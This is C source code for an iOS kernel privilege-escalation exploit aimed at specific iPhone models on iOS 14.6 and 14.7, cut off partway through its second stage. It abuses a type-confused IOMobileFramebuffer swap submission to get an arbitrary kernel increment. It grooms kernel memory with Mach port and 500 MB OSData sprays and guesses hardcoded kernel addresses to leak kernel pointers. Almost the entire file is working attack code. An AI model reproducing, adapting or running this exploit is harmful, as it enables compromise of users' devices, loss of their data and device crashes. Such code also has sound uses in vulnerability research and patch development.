#include <errno.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/sysctl.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <unistd.h>

#include "array.h"
#include "iokit.h"

#ifdef SAMPLING_MEMORY
#include "kernel_hooks.h"
#include "xnuspy_ctl.h"
#endif

/* For iPhone 8, 14.6, 30 seconds after boot */
#define GUESSED_OSDATA_BUFFER_PTR (0xffffffe8dd594000uLL)

/* For iPhone SE (2016), 14.7, 30 seconds after boot */
/* #define GUESSED_OSDATA_BUFFER_PTR (0xfffffff9942d0000uLL) */

struct ool_msg {
    mach_msg_header_t hdr;
    mach_msg_body_t body;
    mach_msg_ool_ports_descriptor_t ool_ports_desc;
};

static mach_port_t kalloc(size_t len){
    mach_port_t recv_port;
    kern_return_t kret = mach_port_allocate(mach_task_self(),
            MACH_PORT_RIGHT_RECEIVE, &recv_port);

    if(kret){
        printf("%s: mach_port_allocate %s\n", __func__, mach_error_string(kret));
        return MACH_PORT_NULL;
    }

    mach_port_limits_t limits = {0};
    limits.mpl_qlimit = MACH_PORT_QLIMIT_LARGE;
    mach_msg_type_number_t cnt = MACH_PORT_LIMITS_INFO_COUNT;
    mach_port_set_attributes(mach_task_self(), recv_port, MACH_PORT_LIMITS_INFO,
            (mach_port_info_t)&limits, cnt);

    size_t port_count = len / 8;

    /* calloc for MACH_PORT_NULL */
    mach_port_t *ports = calloc(port_count, sizeof(mach_port_t));

    struct ool_msg oolmsg = {0};
    oolmsg.hdr.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) |
        MACH_MSGH_BITS_COMPLEX;
    oolmsg.hdr.msgh_size = sizeof(struct ool_msg);
    oolmsg.hdr.msgh_remote_port = recv_port;
    oolmsg.hdr.msgh_local_port = MACH_PORT_NULL;
    oolmsg.hdr.msgh_id = 0xaabbccdd;
    oolmsg.body.msgh_descriptor_count = 1;

    mach_msg_ool_ports_descriptor_t *opd = &oolmsg.ool_ports_desc;

    opd->address = ports;
    opd->count = port_count;
    opd->deallocate = 0;
    opd->copy = MACH_MSG_PHYSICAL_COPY;
    opd->disposition = MACH_MSG_TYPE_MAKE_SEND;
    opd->type = MACH_MSG_OOL_PORTS_DESCRIPTOR;

    kret = mach_msg(&oolmsg.hdr, MACH_SEND_MSG, sizeof(oolmsg), 0,
            MACH_PORT_NULL, 0, MACH_PORT_NULL);

    if(kret){
        printf("%s: mach_msg %s\n", __func__, mach_error_string(kret));
        return MACH_PORT_NULL;
    }

    return recv_port;
}

static io_connect_t IOMobileFramebufferUserClient_uc(void){
    kern_return_t kret = KERN_SUCCESS;
    io_connect_t IOMobileFramebufferUserClient_user_client = IO_OBJECT_NULL;
    const char *name = "IOMobileFramebuffer";

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching(name));

    if(!service){
        printf("%s: IOServiceGetMatchingService returned NULL\n", __func__);
        return IO_OBJECT_NULL;
    }

    int type = 0;
    kret = IOServiceOpen(service, mach_task_self(), type,
            &IOMobileFramebufferUserClient_user_client);

    if(kret){
        printf("%s: IOServiceOpen returned %s\n", __func__,
                mach_error_string(kret));
        return IO_OBJECT_NULL;
    }

    return IOMobileFramebufferUserClient_user_client;
}

static io_connect_t IOSurfaceRootUserClient_uc(void){
    kern_return_t kret = KERN_SUCCESS;
    io_connect_t IOSurfaceRootUserClient_user_client = IO_OBJECT_NULL;
    const char *name = "IOSurfaceRoot";

    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault,
            IOServiceMatching(name));

    if(!service){
        printf("%s: IOServiceGetMatchingService returned NULL\n", __func__);
        return IO_OBJECT_NULL;
    }

    int type = 0;
    kret = IOServiceOpen(service, mach_task_self(), type,
            &IOSurfaceRootUserClient_user_client);

    if(kret){
        printf("%s: IOServiceOpen returned %s\n", __func__,
                mach_error_string(kret));
        return IO_OBJECT_NULL;
    }

    return IOSurfaceRootUserClient_user_client;
}

static int create_surface(io_connect_t uc){
    /* Thanks @bazad */
    struct _IOSurfaceFastCreateArgs {
        uint64_t address;
        uint32_t width;
        uint32_t height;
        uint32_t pixel_format;
        uint32_t bytes_per_element;
        uint32_t bytes_per_row;
        uint32_t alloc_size;
    };

    struct IOSurfaceLockResult {
        uint8_t _pad1[0x18];
        uint32_t surface_id;
        uint8_t _pad2[0xf60-0x18-0x4];
    };

    struct _IOSurfaceFastCreateArgs create_args = {0};
    create_args.width = 100;
    create_args.height = 100;
    /* below works */
    create_args.pixel_format = 0x42475241;
    create_args.alloc_size = 0;

    struct IOSurfaceLockResult lock_result;
    size_t lock_result_size = sizeof(lock_result);

    kern_return_t kret = IOConnectCallMethod(uc, 6, NULL, 0, &create_args,
            sizeof(create_args), NULL, NULL, &lock_result, &lock_result_size);

    if(kret)
        return -1;

    return lock_result.surface_id;
}

static int create_swap(io_connect_t uc){
    uint64_t swap_id;
    uint32_t cnt = 1;

    kern_return_t kret = IOConnectCallScalarMethod(uc, 4, NULL, 0,
            &swap_id, &cnt);

    if(kret)
        return -1;

    return swap_id;
}

static bool cancel_swap(io_connect_t uc, int swap_id){
    uint64_t in = (uint64_t)swap_id;

    kern_return_t kret = IOConnectCallScalarMethod(uc, 52, &in,
            1, NULL, NULL);

    if(kret){
        printf("%s: s_swap_cancel failed: %s\n", __func__,
                mach_error_string(kret));
        return false;
    }

    return true;
}

static bool submit_stagen_swap(io_connect_t uc,
        uint64_t iosurfaceroot_kaddr, uint64_t recursive_lock_kaddr,
        uint64_t plus_c0_kptr, uint64_t device_cache_kaddr,
        int *swap_id_out){
    static uint64_t a = 0;
    kern_return_t kret = KERN_SUCCESS;

    if(!a){
        kret = vm_allocate(mach_task_self(), (vm_address_t *)&a, 0x4000, 1);

        if(kret){
            printf("%s: vm_allocate: %s\n", __func__,
                    mach_error_string(kret));
            *swap_id_out = 0;
            return false;
        }
    }

    int swap_id = create_swap(uc);

    if(swap_id == -1){
        printf("%s: failed to make swap\n", __func__);
        *swap_id_out = 0;
        return false;
    }

    uint8_t swap_submit_in[0x280];
    memset(swap_submit_in, 0, sizeof(swap_submit_in));
    
    /* surface+0x28: IOSurfaceRoot, must point to something valid
     * for the 10-byte zero primitive */
    *(uint64_t *)(swap_submit_in + 0x67) = iosurfaceroot_kaddr;

    /* surface+0x38: must be non-NULL so our swap is registered
     * in the surface array */
    *(uint64_t *)(swap_submit_in + 0x77) = 0x4141414141414141;
    
    /* surface+0x40: must be the same as *(device_cache+0x38) for the
     * 10-byte zero primitive we have */
    *(uint64_t *)(swap_submit_in + 0x97) = device_cache_kaddr + 0x38;

    /* surface+0x48: IOSurfaceDeviceCache pointer */
    *(uint64_t *)(swap_submit_in + 0x9f) = device_cache_kaddr;

    /* surface+0x80: IORecursiveLock */
    *(uint64_t *)(swap_submit_in + 0x11b) = recursive_lock_kaddr;

    /* surface+0xb0: size passed to IOMalloc_external * 8
     *
     * Make this large so we bail before the phone tries to do
     * a virtual method call with a pointer we can't guess
     * inside IOSurfaceClient::init */
    *(uint32_t *)(swap_submit_in + 0x14b) = 0x7fffffff;

    /* surface+0xc0: kernel pointer, can do an arbitrary decrement/
     * increment with *(surface+0xc0)+0x14 */
    *(uint64_t *)(swap_submit_in + 0x15b) = plus_c0_kptr;

    *(uint64_t *)(swap_submit_in + 0x38) = a;
    *(uint32_t *)(swap_submit_in + 0x40) = swap_id;

    /* Enable all layers so we can control more of the
     * type confused IOSurface */
    *(uint32_t *)(swap_submit_in + 0xc8) = (1 << 2) | (1 << 1) | (1 << 0);

    /* Prevent this swap from being dropped inside swap_start_gated
     * (will be considered as a "no-op swap" otherwise) */
    *(uint32_t *)(swap_submit_in + 0xcc) = 0x42424242;

    /* This must not be 0, 2, 9, 12, or 13, otherwise the most recently
     * submitted swap will not show up at UnifiedPipeline+0xb18 */
    *(uint32_t *)(swap_submit_in + 0xf4) = 0x100;

    /* Set all to 4 so the above is recorded in the swap object */
    *(uint32_t *)(swap_submit_in + 0x100) = 4;
    *(uint32_t *)(swap_submit_in + 0x104) = 4;
    *(uint32_t *)(swap_submit_in + 0x108) = 4;

    /* Shared client id */
    *(uint8_t *)(swap_submit_in + 0x157) = 0;
    *(uint8_t *)(swap_submit_in + 0x158) = 0;

    kret = IOConnectCallStructMethod(uc, 5, swap_submit_in,
            sizeof(swap_submit_in), NULL, NULL);

    if(kret){
        printf("%s: swap_submit: %s\n", __func__, mach_error_string(kret));
        *swap_id_out = 0;
        return false;
    }

    *swap_id_out = swap_id;

    return true;
}

/* Keep track of the ports that external method 83 produces so we
 * can clean them up after kernel read/write is obtained */
static struct array *g_increment32_n_ports = NULL;

static bool increment32_n(uint64_t kaddr, uint32_t times){
    static io_connect_t iomfbuc = IO_OBJECT_NULL;

    if(!iomfbuc){
        iomfbuc = IOMobileFramebufferUserClient_uc();

        if(!iomfbuc){
            printf("%s: failed making iomfb user client\n", __func__);
            return false;
        }
    }

    if(!g_increment32_n_ports){
        g_increment32_n_ports = array_new();

        if(!g_increment32_n_ports){
            printf("%s: failed to allocate array for ports\n", __func__);
            return false;
        }
    }

    int swap_id;

    /* Using IOSurface::increment_use_count, this alone is enough to
     * call it */
    if(!submit_stagen_swap(iomfbuc, 0, 0, kaddr - 0x14, 0, &swap_id))
        return false;

    for(uint32_t i=0; i<times; i++){
        uint64_t in = 16;
        uint64_t out = 0;
        uint32_t outcnt = 1;

        kern_return_t kret = IOConnectCallScalarMethod(iomfbuc, 83, &in,
                1, &out, &outcnt);

        if(kret){
            printf("%s: s_displayed_fb_surface failed at %d: %s\n", __func__,
                    i, mach_error_string(kret));
            return false;
        }

        array_insert(g_increment32_n_ports, (void *)(uintptr_t)out);
    }

    return true;
}

static uint32_t transpose(uint32_t val){
    uint32_t ret = 0;

    for(size_t i = 0; val > 0; i += 8){
        ret += (val % 255) << i;
        val /= 255;
    }

    return ret + 0x01010101;
}

struct set_value_spray {
    uint32_t surface_id;
    uint32_t pad;

    /* Serialized XML */
    uint32_t set_value_data[7];

    /* OSData spray data */
    uint8_t osdata_spray[];
};

static uint32_t g_cur_osdata_spray_key = 0;
static struct set_value_spray *g_spray_data_one_page = NULL;
static struct set_value_spray *g_spray_data_two_pages = NULL;
static struct set_value_spray *g_spray_data_three_pages = NULL;
static struct set_value_spray *g_spray_data_four_pages = NULL;
static uint8_t *g_spray_junk_buf_one_page = NULL;
static uint8_t *g_spray_junk_buf_two_pages = NULL;
static uint8_t *g_spray_junk_buf_three_pages = NULL;
static uint8_t *g_spray_junk_buf_four_pages = NULL;
static bool g_osdata_spray_inited = false;

static void osdata_spray_init(void){
    g_spray_data_one_page = malloc(sizeof(struct set_value_spray) + 0x4000);

    if(!g_spray_data_one_page)
        return;

    g_spray_data_two_pages = malloc(sizeof(struct set_value_spray) + 0x8000);

    if(!g_spray_data_two_pages)
        return;

    g_spray_data_three_pages = malloc(sizeof(struct set_value_spray) + 0xc000);

    if(!g_spray_data_three_pages)
        return;

    g_spray_data_four_pages = malloc(sizeof(struct set_value_spray) + 0x10000);

    if(!g_spray_data_four_pages)
        return;

    g_spray_junk_buf_one_page = malloc(0x4000);

    if(!g_spray_junk_buf_one_page)
        return;

    g_spray_junk_buf_two_pages = malloc(0x8000);

    if(!g_spray_junk_buf_two_pages)
        return;

    g_spray_junk_buf_three_pages = malloc(0xc000);

    if(!g_spray_junk_buf_three_pages)
        return;

    g_spray_junk_buf_four_pages = malloc(0x10000);

    if(!g_spray_junk_buf_four_pages)
        return;

    memset(g_spray_junk_buf_one_page, '1', 0x4000);
    memset(g_spray_junk_buf_two_pages, '2', 0x8000);
    memset(g_spray_junk_buf_three_pages, '3', 0xc000);
    memset(g_spray_junk_buf_four_pages, '4', 0x10000);

    g_osdata_spray_inited = true;
}

static bool osdata_spray_free(io_connect_t iosruc, int surface_id,
        uint32_t spray_key){
    uint64_t delete_in[] = { (uint64_t)surface_id, spray_key, 0 };

    uint8_t delete_out[4];
    size_t delete_outcnt = sizeof(delete_out);

    kern_return_t kret = IOConnectCallStructMethod(iosruc, 11,
            delete_in, sizeof(delete_in), delete_out, &delete_outcnt);

    if(kret){
        printf("%s: s_delete_value failed for key %#x: %s\n", __func__,
                spray_key, mach_error_string(kret));
        return false;
    }

    return true;
}

static bool osdata_spray_internal(io_connect_t iosruc,
        int surface_id, uint32_t *keyp, uint8_t *spray_data,
        size_t spray_sz, struct set_value_spray *spray_buf){
    size_t aligned_spray_sz = spray_sz;

    if(spray_sz & 0x3fffuLL)
        aligned_spray_sz = (spray_sz + 0x4000) & ~(0x3fffuLL);

    uint32_t cur_spray_key = transpose(g_cur_osdata_spray_key);

    spray_buf->surface_id = surface_id;
    spray_buf->pad = 0;

    uint32_t *set_value_data = spray_buf->set_value_data;

    *set_value_data++ = kOSSerializeBinarySignature;
    *set_value_data++ = kOSSerializeEndCollection | kOSSerializeArray | 1;
    *set_value_data++ = kOSSerializeEndCollection | kOSSerializeDictionary | 1;
    *set_value_data++ = kOSSerializeSymbol | 5;
    *set_value_data++ = cur_spray_key;
    *set_value_data++ = 0;
    *set_value_data++ = kOSSerializeEndCollection | kOSSerializeData | aligned_spray_sz;

    memcpy(spray_buf->osdata_spray, spray_data, spray_sz);

    uint32_t out = 0;
    size_t outsz = sizeof(out);

    kern_return_t kret = IOConnectCallStructMethod(iosruc, 9, spray_buf,
            sizeof(struct set_value_spray) + aligned_spray_sz, &out, &outsz);

    if(kret){
        printf("%s: s_set_value failed: %s\n", __func__,
                mach_error_string(kret));
        return false;
    }

    *keyp = cur_spray_key;

    g_cur_osdata_spray_key++;

    return true;
}

static bool osdata_junk_spray(io_connect_t iosruc, int surface_id,
        size_t sz, uint32_t *keyp){
    if(!g_osdata_spray_inited){
        osdata_spray_init();

        if(!g_osdata_spray_inited){
            printf("%s: failed to init osdata spray globals\n", __func__);
            return false;
        }
    }

    struct set_value_spray *spray_buf;
    uint8_t *buf;

    if(sz <= 0x4000){
        spray_buf = g_spray_data_one_page;
        buf = g_spray_junk_buf_one_page;
    }
    else if(sz <= 0x8000){
        spray_buf = g_spray_data_two_pages;
        buf = g_spray_junk_buf_two_pages;
    }
    else if(sz <= 0xc000){
        spray_buf = g_spray_data_three_pages;
        buf = g_spray_junk_buf_three_pages;
    }
    else if(sz <= 0x10000){
        spray_buf = g_spray_data_four_pages;
        buf = g_spray_junk_buf_four_pages;
    }
    else{
        printf("%s: unsupported size %#zx\n", __func__, sz);
        return false;
    }

    return osdata_spray_internal(iosruc, surface_id, keyp, buf,
            sz, spray_buf);
}

static bool osdata_spray(io_connect_t iosruc, int surface_id,
        uint8_t *data, size_t sz, uint32_t *keyp){
    if(!g_osdata_spray_inited){
        osdata_spray_init();

        if(!g_osdata_spray_inited){
            printf("%s: failed to init osdata spray globals\n", __func__);
            return false;
        }
    }

    struct set_value_spray *spray_buf;

    if(sz <= 0x4000)
        spray_buf = g_spray_data_one_page;
    else if(sz <= 0x8000)
        spray_buf = g_spray_data_two_pages;
    else if(sz <= 0xc000)
        spray_buf = g_spray_data_three_pages;
    else if(sz <= 0x10000)
        spray_buf = g_spray_data_four_pages;
    else{
        printf("%s: unsupported size %#zx\n", __func__, sz);
        return false;
    }

    return osdata_spray_internal(iosruc, surface_id, keyp, data,
            sz, spray_buf);
}

static int ptrcmp(const void *_a, const void *_b){
    const uintptr_t a = *(uintptr_t *)_a;
    const uintptr_t b = *(uintptr_t *)_b;

    if(a < b)
        return -1;
    else if(a == b)
        return 0;
    else
        return 1;
}

struct pipe_hole_filler {
    int rfd, wfd;
    uint64_t inferred_pipebuf_kva;
};

struct iosruc_hole_filler {
    io_connect_t iosruc;
    uint64_t inferred_client_array_kva;
    struct array *surface_ids;
};

#ifdef SAMPLING_MEMORY
extern void *g_osdata_kaddrs[8000];
extern uint64_t g_osdata_kaddrs_idx;
extern bool g_record_osdata_kaddrs;

static void sample_kernel_map(void){
    struct array *osdata_kaddrs = array_new();

    /* Allocations should be contiguous after the 1000th one */
    for(int i=1000; i<g_osdata_kaddrs_idx; i++)
        array_insert(osdata_kaddrs, g_osdata_kaddrs[i]);

    array_qsort(osdata_kaddrs, ptrcmp);

    size_t ndists = g_osdata_kaddrs_idx - 500;
    uint64_t *dists = malloc(sizeof(uint64_t) * ndists);

    for(int i=0; i<osdata_kaddrs->len; i++){
        void *kptr = osdata_kaddrs->items[i];

        if(i == 0)
            puts("");
        else{
            uint64_t before = (uint64_t)osdata_kaddrs->items[i-1];
            uint64_t dist = (uint64_t)kptr - before;

            dists[i] = dist;

            if(dist != 0x10000){
                printf("%s: WARNING: %p [%#llx bytes from behind]\n",
                        __func__, kptr, dist);
            }
        }
    }

    printf("%s: to add to alloc_averager.py:\n", __func__);

    void *last = osdata_kaddrs->items[osdata_kaddrs->len-1];

    printf("[%p, %p],\n", osdata_kaddrs->items[0],
            (void *)((uintptr_t)last + 0x100000 - 0x4000));
}

static bool install_kernel_memory_allocate_hook(void){
    long SYS_xnuspy_ctl;
    size_t oldlen = sizeof(long);
    int res = sysctlbyname("kern.xnuspy_ctl_callnum", &SYS_xnuspy_ctl,
            &oldlen, NULL, 0);

    if(res == -1){
        printf("sysctlbyname with kern.xnuspy_ctl_callnum failed: %s\n",
                strerror(errno));
        return false;
    }

    res = syscall(SYS_xnuspy_ctl, XNUSPY_CHECK_IF_PATCHED, 0, 0, 0);

    if(res != 999){
        printf("xnuspy_ctl isn't present?\n");
        return false;
    }

    extern uint64_t kernel_slide;
    res = syscall(SYS_xnuspy_ctl, XNUSPY_CACHE_READ, KERNEL_SLIDE,
            &kernel_slide, 0, 0);

    if(res){
        printf("failed reading kernel slide from xnuspy cache\n");
        return false;
    }

    /* iPhone 8, 14.6 */
    /* uint64_t kma = 0xfffffff007b2e66c; */

    /* iPhone SE (2016), 14.7 */
    uint64_t kma = 0xfffffff0071f1384;

    res = syscall(SYS_xnuspy_ctl, XNUSPY_INSTALL_HOOK,
            kma, _kernel_memory_allocate, &kernel_memory_allocate);

    if(res)
        return false;

    return true;
}
#endif

static bool exploit_stage1(struct array **iosruc_hole_fillersp,
        struct array **pipe_hole_fillersp, uint64_t *anchor_alloc_kaddrp){
    kern_return_t kret = KERN_SUCCESS;

    /* Shape the kernel virtual address space.
     *  1. Fill up the kalloc map */

    struct array *kalloc_map_filler_recvs = array_new();

    for(int i=0; i<2000; i++){
        mach_port_t r = kalloc(0x10000);

        if(!r){
            printf("%s: failed kalloc map filler recv %d\n", __func__, i);
            break;
        }

        array_insert(kalloc_map_filler_recvs, (void *)(uintptr_t)r);
    }

    io_connect_t osdata_spray_iosruc = IOSurfaceRootUserClient_uc();

    if(!osdata_spray_iosruc){
        printf("%s: failed making IOSurfaceRootUserClient?\n", __func__);
        return false;
    }

    int osdata_spray_surface = create_surface(osdata_spray_iosruc);

    if(osdata_spray_surface == -1){
        printf("%s: failed to create spray IOSurface\n", __func__);
        return false;
    }

    struct array *iosruc_hole_fillers = array_new();

    /* Free 16mb to the left of the anchor alloc */
    const uint64_t anchor_alloc_free_mbs = 16;
    const uint64_t anchor_alloc_free_bytes = 0x100000 * anchor_alloc_free_mbs;
    const uint32_t spray_sz = 0x10000;

    /* How many 0x10000-byte holes we create to the left of the
     * anchor alloc */
    uint32_t nholes_left = anchor_alloc_free_bytes / spray_sz;

    for(int i=0; i<(nholes_left + 20) / 2; i++){
        struct iosruc_hole_filler *ihf = malloc(sizeof(*ihf));

        io_connect_t uc = IOSurfaceRootUserClient_uc();

        if(!uc){
            printf("%s: could not make hole filler iosruc @ %d\n",
                    __func__, i);
            return false;
        }

        ihf->iosruc = uc;
        ihf->inferred_client_array_kva = 0;
        ihf->surface_ids = array_new();

        array_insert(iosruc_hole_fillers, ihf);
    }

    /* We'll also be filling holes with 0x10000-byte pipe buffers later */
    struct array *pipe_hole_fillers = array_new();

    for(int i=0; i<(nholes_left + 20) / 2; i++){
        struct pipe_hole_filler *phf = malloc(sizeof(*phf));
        int p[2];

        if(pipe(p) == -1){
            printf("%s: pipe call %d failed: %s\n", __func__, i,
                    strerror(errno));
            return false;
        }

        phf->rfd = p[0];
        phf->wfd = p[1];
        phf->inferred_pipebuf_kva = 0;

        array_insert(pipe_hole_fillers, phf);
    }

    /* Prep for future kernel map IOSurfaceClient arrays:
     * This will set the surface client array capacity for the provider to
     * all the iosruc's, which will make just one IOSurfaceClient allocation
     * cause a kernel map allocation */
    struct iosruc_hole_filler *ihf0 = iosruc_hole_fillers->items[0];
    int nsurfaces = 4095;
    int *surfaces = malloc(sizeof(int) * nsurfaces);

    for(int k=0; k<nsurfaces; k++){
        surfaces[k] = create_surface(ihf0->iosruc);

        if(!surfaces[k]){
            printf("%s: could not make surface for hole filler 0\n", __func__);
            return false;
        }
    }

    /* Free all the surfaces except one so we can create new
     * surfaces later */
    for(int k=0; k<nsurfaces-1; k++){
        uint64_t surface = (uint64_t)surfaces[k];

        kret = IOConnectCallScalarMethod(ihf0->iosruc, 1, &surface,
                1, NULL, NULL);

        if(kret){
            printf("%s: s_release_surface failed: %s\n", __func__,
                    mach_error_string(kret));
            return false;
        }
    }

    array_insert(ihf0->surface_ids, (void *)(uintptr_t)surfaces[nsurfaces-1]);

    free(surfaces);
    surfaces = NULL;

    /* 2. Spray 500 MB into the kernel map via OSData */
    struct set_value_spray {
        uint32_t surface_id;
        uint32_t pad;

        /* Serialized XML */
        uint32_t set_value_data[7];

        /* OSData spray data */
        uint8_t osdata_spray[];
    };

    const uint32_t mbs = 500;
    const size_t total_spray = 0x100000 * mbs;
    const uint32_t nsprays = total_spray / spray_sz;

    struct array *osdata_spray_keys = array_new();
    uint8_t *osdata_spray_buf = malloc(spray_sz);

#ifdef SAMPLING_MEMORY
    if(!install_kernel_memory_allocate_hook())
        return false;

    g_record_osdata_kaddrs = true;
#endif

    uint32_t osdata_spray_buf_constant = 0x12345678;

    /* Record the page number as well as the index into osdata_spray_keys */
    for(int i=0; i<nsprays; i++){
        ((uint32_t *)osdata_spray_buf)[0] = osdata_spray_buf_constant;
        ((uint32_t *)osdata_spray_buf)[1] = 0;
        ((uint32_t *)osdata_spray_buf)[2] = i;

        ((uint32_t *)osdata_spray_buf)[0x4000/4] = osdata_spray_buf_constant;
        ((uint32_t *)osdata_spray_buf)[(0x4000/4)+1] = 1;
        ((uint32_t *)osdata_spray_buf)[(0x4000/4)+2] = i;

        ((uint32_t *)osdata_spray_buf)[0x8000/4] = osdata_spray_buf_constant;
        ((uint32_t *)osdata_spray_buf)[(0x8000/4)+1] = 2;
        ((uint32_t *)osdata_spray_buf)[(0x8000/4)+2] = i;

        ((uint32_t *)osdata_spray_buf)[0xc000/4] = osdata_spray_buf_constant;
        ((uint32_t *)osdata_spray_buf)[(0xc000/4)+1] = 3;
        ((uint32_t *)osdata_spray_buf)[(0xc000/4)+2] = i;

        uint32_t key;

        if(!osdata_spray(osdata_spray_iosruc, osdata_spray_surface,
                    osdata_spray_buf, spray_sz, &key)){
            printf("%s: failed while spraying 500mb\n", __func__);
            return false;
        }

        array_insert(osdata_spray_keys, (void *)(uintptr_t)key);
    }

#ifdef SAMPLING_MEMORY
    g_record_osdata_kaddrs = false;
    sample_kernel_map();
    g_osdata_kaddrs_idx = 0;
    return true;
#endif

    uintptr_t anchor_alloc_kaddr = GUESSED_OSDATA_BUFFER_PTR;

    /* printf("%s: Guessing that %#lx points to one of our OSData buffers\n", */
    /*         __func__, anchor_alloc_kaddr); */

    if(!increment32_n(anchor_alloc_kaddr, 1)){
        printf("%s: failed to perform the arbitrary increment at %#lx\n",
                __func__, anchor_alloc_kaddr);
        return false;
    }

    uint32_t anchor_alloc = -1, anchor_alloc_key = -1;

    /* Figure out which buffer was changed */
    uint8_t *readback_buf = malloc(0x10 + spray_sz);
    memset(readback_buf, 0, 0x10 + spray_sz);

    for(int i=0; i<osdata_spray_keys->len; i++){
        uint32_t key = (uint32_t)(uintptr_t)osdata_spray_keys->items[i];

        uint32_t get_value_input[4];
        memset(get_value_input, 0, sizeof(get_value_input));

        get_value_input[0] = osdata_spray_surface;
        get_value_input[2] = key;

        size_t readback_buf_sz = 0x10 + spray_sz;

        kret = IOConnectCallStructMethod(osdata_spray_iosruc, 10,
                get_value_input, sizeof(get_value_input), readback_buf,
                &readback_buf_sz);

        if(kret){
            printf("%s: failed to read back OSData buffer for key %#x: %s\n",
                    __func__, key, mach_error_string(kret));
            return false;
        }

        uint8_t *readback_buf_orig = readback_buf;

        readback_buf += 0x10;

        for(int k=0; k<4; k++){
            uint32_t constant = *(uint32_t *)readback_buf;

            if(constant != osdata_spray_buf_constant){
                uint32_t pagenum = *(uint32_t *)(readback_buf + 0x4);
                uint32_t osdata_spray_key_idx = *(uint32_t *)(readback_buf + 0x8);

                printf("%s: pagenum %d keyidx %d\n", __func__,pagenum,
                        osdata_spray_key_idx);

                anchor_alloc = osdata_spray_key_idx;
                anchor_alloc_key = (uint32_t)(uintptr_t)osdata_spray_keys->items[anchor_alloc];
                anchor_alloc_kaddr -= (pagenum * 0x4000);

                break;
            }

            readback_buf += 0x4000;
        }

        if(anchor_alloc != -1){
            printf("%s: found OSData buffer for key %#x at %#lx\n",
                    __func__, anchor_alloc_key, anchor_alloc_kaddr);
            break;
        }

        readback_buf = readback_buf_orig;
        memset(readback_buf, 0, spray_sz);
    }

    if(anchor_alloc == -1){
        printf("%s: our guess was wrong, we may panic\n", __func__);
        return false;
    }

    /* Free 16 MB worth of allocations to the left of the anchor alloc */
    for(int i=anchor_alloc-nholes_left; i<anchor_alloc; i++){
        uint32_t key = (uint32_t)(uintptr_t)osdata_spray_keys->items[i];

        if(!osdata_spray_free(osdata_spray_iosruc, osdata_spray_surface, key)){
            printf("%s: left: failed freeing data for key %#x\n",
                    __func__, key);
            return false;
        }

        osdata_spray_keys->items[i] = (void *)-1;
    }

    uint64_t cur_left_hole_kva = anchor_alloc_kaddr - (spray_sz * nholes_left);

    /* We try and get a layout like this
     *   [IOSurfaceClient array][pipe buffer]<repeats>[anchor alloc]
     * or like this
     *   [pipe buffer][IOSurfaceClient array]<repeats>[anchor alloc]
     * because each time we use the 32-bit increment, a Mach port is
     * created, and ports are not an unlimited resource. Both these
     * arrays have the same length so this is safe */
    for(int i=0; i<iosruc_hole_fillers->len; i++){
        bool last_ihf = (i == iosruc_hole_fillers->len - 1);

        /* Exclude the first iosruc hole filler, because its IOSurfaceClient
         * array was allocated way before */
        struct iosruc_hole_filler *ihf = NULL;

        if(!last_ihf)
            ihf = iosruc_hole_fillers->items[i+1];

        struct pipe_hole_filler *phf = pipe_hole_fillers->items[i];

        /* We're betting on the KVA space being laid out as described
         * above, fingers crossed... */
        if(!last_ihf)
            ihf->inferred_client_array_kva = cur_left_hole_kva;

        phf->inferred_pipebuf_kva = cur_left_hole_kva + spray_sz;

        cur_left_hole_kva += (spray_sz * 2);

        uint8_t contents[0x10000];
        memset(contents, i, sizeof(contents));

        int surface_id = 0;

        if(!last_ihf)
            surface_id = create_surface(ihf->iosruc);

        int write_res = write(phf->wfd, contents, sizeof(contents));

        if(!last_ihf && surface_id == -1){
            printf("%s: failed to create IOSurfaceClient array for ihf %d\n",
                    __func__, i);
            return false;
        }

        if(write_res == -1){
            printf("%s: write failed for phf %d\n", __func__, i);
            return false;
        }

        if(!last_ihf)
            array_insert(ihf->surface_ids, (void *)(uintptr_t)surface_id);
    }

    /* There's a good chance that the IOSurfaceRootUserClient's
     * surface client array in the middle of this array falls in
     * the middle of the holes we reclaimed. Only spray surfaces here
     * so when we do stage2, the leaked IOSurfaceRootUserClient + other
     * pointers will correspond to this one */
    int mididx = iosruc_hole_fillers->len / 2;
    int spray_surface_id = 0;

    struct iosruc_hole_filler *mid = iosruc_hole_fillers->items[mididx];

    /* We don't want to trigger a reallocation from 0x10000 -->
     * 0x20000 bytes */
    while(spray_surface_id < 8191){
        spray_surface_id = create_surface(mid->iosruc);

        if(spray_surface_id == -1)
            break;

        array_insert(mid->surface_ids, (void *)(uintptr_t)spray_surface_id);
    }

    *iosruc_hole_fillersp = iosruc_hole_fillers;
    *pipe_hole_fillersp = pipe_hole_fillers;
    *anchor_alloc_kaddrp = anchor_alloc_kaddr;

    return true;
}

static bool exploit_stage2(struct array *iosruc_hole_fillers,
        uint64_t *iosr_kaddrp, uint64_t *iosruc_kaddrp,
        uint64_t *iosc_array_kaddrp,
        uint32_t *iosc_array_capacityp){
    /* Here we will leak the address of some IOSurfaceRootUserClient
     * and the address of its IOSurfaceClient array. We do this by
     * picking one of the IOSurfaceClient pointers in mid's surface client
     * array to increment. We increment it 0x70 bytes and so that its
     * IOSurface pointer now points to the IOSurfaceRootUserClient of the
     * IOSurfaceClient it overlaps with. Then we can leak fields of that
     * user client pointer with s_get_bulk_attachments.
     *
     * We don't know if mid->inferred_client_array_kva *actually*
     * corresponds to mid's IOSurfaceClient array, but it will correspond
     * to one of the iosruc_hole_filler structures */

    int mididx = iosruc_hole_fillers->len / 2;
    struct iosruc_hole_filler *mid = iosruc_hole_fillers->items[mididx];

    /* We allocated enough IOSurfaceClient objects so we should own all
     * kalloc.160 elements for the pages near the end of the surface
     * ID array. There's 102 elements per kalloc.160 page. Maybe we
     * can get one that sits on the eigth-last page in its all_used list */
    int surface_idx = mid->surface_ids->len - (102 * 8);
    int target_surface = (int)(uintptr_t)mid->surface_ids->items[surface_idx];

    for(int i=1; i<iosruc_hole_fillers->len; i++){
        struct iosruc_hole_filler *ihf = iosruc_hole_fillers->items[i];

        uint64_t current_client_array_guess = ihf->inferred_client_array_kva;

        /* We account for both KVA space layouts:
         *   [IOSurfaceClient array][pipe buffer]<repeats>[anchor alloc]
         * and
